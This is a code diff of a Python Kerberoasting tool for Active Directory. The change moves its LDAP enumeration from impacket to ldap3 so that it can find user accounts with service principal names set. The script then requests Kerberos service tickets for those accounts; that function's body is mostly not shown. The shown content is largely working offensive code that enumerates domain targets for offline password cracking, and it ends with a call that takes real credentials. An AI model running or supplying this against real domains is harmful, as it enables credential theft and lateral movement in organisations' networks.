@@ -1,29 +1,25 @@
-from impacket.ldap import LDAPConnection, LDAPSearchError
+from ldap3 import Server, Connection, SUBTREE, ALL_ATTRIBUTES
 from impacket.krb5.kerberosv5 import getKerberosTGS
 
 def find_kerberoastable_users(username, password, domain, dc_ip):
     try:
         # Connect to the Domain Controller via LDAP
-        ldap_conn = LDAPConnection(dc_ip, username=f"{domain}\\{username}", password=password)
-        ldap_conn.open()
-        ldap_conn.bind()
+        server = Server(dc_ip)
+        conn = Connection(server, user=f"{domain}\\{username}", password=password)
+        conn.bind()
 
         # Search for kerberoastable users (users with SPNs set)
-        _, entries = ldap_conn.search(
-            search_base=f"DC={','.join(domain.split('.'))}",
-            search_filter="(servicePrincipalName=*)",
-            attributes=["sAMAccountName"]
-        )
+        conn.search(search_base='DC=' + ',DC='.join(domain.split('.')),
+                     search_filter='(&(objectCategory=user)(servicePrincipalName=*))',
+                     search_scope=SUBTREE,
+                     attributes=['sAMAccountName'])
 
-        kerberoastable_users = [entry['sAMAccountName'] for _, entry in entries]
+        kerberoastable_users = [entry['sAMAccountName'].value for entry in conn.entries]
 
-        ldap_conn.unbind()
+        conn.unbind()
 
         return kerberoastable_users
 
-    except LDAPSearchError as e:
-        print(f"LDAP Search Error: {e}")
-        return []
     except Exception as e:
         print(f"Error while searching for kerberoastable users: {e}")
         return []
@@ -49,6 +45,7 @@ def kerberoast_kerberoastable_users(username, password, domain, dc_ip):
 
     except Exception as e:
         print(f"Error during Kerberoasting: {e}")
+        
 # Replace "username", "password", "domain", and "dc_ip" with your actual credentials and domain controller's IP address
 kerberoast_kerberoastable_users("username", "password", "domain", "dc_ip")
 
